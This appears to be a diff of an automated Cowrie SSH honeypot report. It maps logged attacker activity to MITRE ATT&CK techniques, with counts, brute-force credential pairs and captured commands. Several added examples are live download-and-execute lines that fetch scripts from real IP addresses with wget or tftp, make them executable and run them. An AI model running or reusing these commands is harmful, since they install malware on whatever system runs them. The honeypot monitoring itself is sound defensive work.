@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-15 01:03:11",
+  "generated": "2026-08-15 02:03:09",
   "totals": {
-    "commands": 54,
-    "login_failed": 622,
-    "login_success": 7,
-    "sessions": 636
+    "commands": 98,
+    "login_failed": 662,
+    "login_success": 12,
+    "sessions": 676
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 622,
+      "count": 662,
       "examples": [
         "adminuser / 123456",
         "root / Qq123456",
@@ -21,34 +21,67 @@
         "milad / milad"
       ],
       "first": "2026-08-15T00:00:01.563880Z",
-      "last": "2026-08-15T01:00:09.338176Z",
-      "unique_ips": 16
-    },
-    {
-      "id": "T1078",
-      "name": "Valid Accounts",
-      "tactic": "Initial Access",
-      "count": 7,
-      "examples": [
-        "enable / system",
-        " / ",
-        "root / root",
-        "root / root123456"
-      ],
-      "first": "2026-08-15T00:02:00.287482Z",
-      "last": "2026-08-15T00:55:55.616925Z",
-      "unique_ips": 6
+      "last": "2026-08-15T02:02:31.458442Z",
+      "unique_ips": 23
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 2,
+      "count": 18,
       "examples": [
-        "/bin/busybox cp /bin/busybox condi72; >condi72; /bin/busybox chmod 777 condi72; /bin/busybox condixx"
+        "/bin/busybox cp /bin/busybox condi72; >condi72; /bin/busybox chmod 777 condi72; /bin/busybox condixx",
+        "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
+        ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
+        ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
+        ">/var/tmp/d && chmod 777 /var/tmp/d && /var/tmp/d && cd /var/tmp/"
       ],
       "first": "2026-08-15T00:48:26.058950Z",
-      "last": "2026-08-15T00:48:28.354625Z",
+      "last": "2026-08-15T01:18:36.830987Z",
+      "unique_ips": 3
+    },
+    {
+      "id": "T1078",
+      "name": "Valid Accounts",
+      "tactic": "Initial Access",
+      "count": 12,
+      "examples": [
+        "enable / system",
+        " / ",
+        "root / root",
+        "root / root123456",
+        "admin / admin"
+      ],
+      "first": "2026-08-15T00:02:00.287482Z",
+      "last": "2026-08-15T01:29:34.742479Z",
+      "unique_ips": 11
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "Command and Control",
+      "count": 6,
+      "examples": [
+        "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
+        "http://2.26.136.128/twget.sh",
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
+        "http://185.93.89.72/wget",
+        "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t"
+      ],
+      "first": "2026-08-15T01:16:22.114595Z",
+      "last": "2026-08-15T01:18:36.830987Z",
+      "unique_ips": 2
+    },
+    {
+      "id": "T1033",
+      "name": "System Owner/User Discovery",
+      "tactic": "Discovery",
+      "count": 1,
+      "examples": [
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
+      ],
+      "first": "2026-08-15T01:18:01.512949Z",
+      "last": "2026-08-15T01:18:01.512949Z",
       "unique_ips": 1
     },
     {
@@ -67,6 +100,22 @@
   "unmapped": [
     [
       "sh",
+      8
+    ],
+    [
+      "/bin/busybox",
+      7
+    ],
+    [
+      "enable",
+      5
+    ],
+    [
+      "system",
+      5
+    ],
+    [
+      "shell",
       5
     ],
     [
@@ -78,20 +127,8 @@
       3
     ],
     [
-      "enable",
-      2
-    ],
-    [
-      "system",
-      2
-    ],
-    [
       "linuxshell",
-      2
-    ],
-    [
-      "shell",
-      2
+      3
     ],
     [
       ">/tmp/.codi && cd /tmp/",
@@ -139,10 +176,6 @@
     ],
     [
       ">/boot/.codi && cd /boot/",
-      2
-    ],
-    [
-      ">/usr/.codi && cd /usr/",
       2
     ]
   ]
